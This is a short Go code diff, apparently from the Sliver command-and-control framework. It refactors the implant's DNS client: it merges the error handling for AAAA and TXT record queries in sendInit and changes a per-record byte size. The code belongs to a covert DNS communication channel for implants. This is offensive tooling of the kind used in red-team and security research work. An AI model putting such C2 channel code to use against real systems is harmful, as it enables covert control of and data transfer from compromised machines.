@@ -397,33 +397,21 @@ func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encode
 	resp := []byte{}
 	for _, subdata := range allSubdata {
 
+		var respData []byte
+		var err error
 		if s.noTXT {
-			respData, _, err := resolver.AAAA(subdata)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[dns] init msg failure %v", err)
-				// {{end}}
-				return nil, err
-			}
-			if 0 < len(respData) {
-				msg := &dnspb.DNSMessage{}
-				err = proto.Unmarshal(respData, msg)
-				if err == nil {
-					msgData := msg.Data
-					resp = append(resp, msgData...)
-				}
-			}
+			respData, _, err = resolver.AAAA(subdata)
 		} else {
-			respData, _, err := resolver.TXT(subdata)
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[dns] init msg failure %v", err)
-				// {{end}}
-				return nil, err
-			}
-			if 0 < len(respData) {
-				resp = append(resp, respData...)
-			}
+			respData, _, err = resolver.TXT(subdata)
+		}
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[dns] init msg failure %v", err)
+			// {{end}}
+			return nil, err
+		}
+		if 0 < len(respData) {
+			resp = append(resp, respData...)
 		}
 	}
 	return resp, nil
@@ -567,7 +555,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 
 	var bytesPerTxt uint32
 	if s.noTXT {
-		bytesPerTxt = 224
+		bytesPerTxt = 192
 	} else {
 		bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
 	}
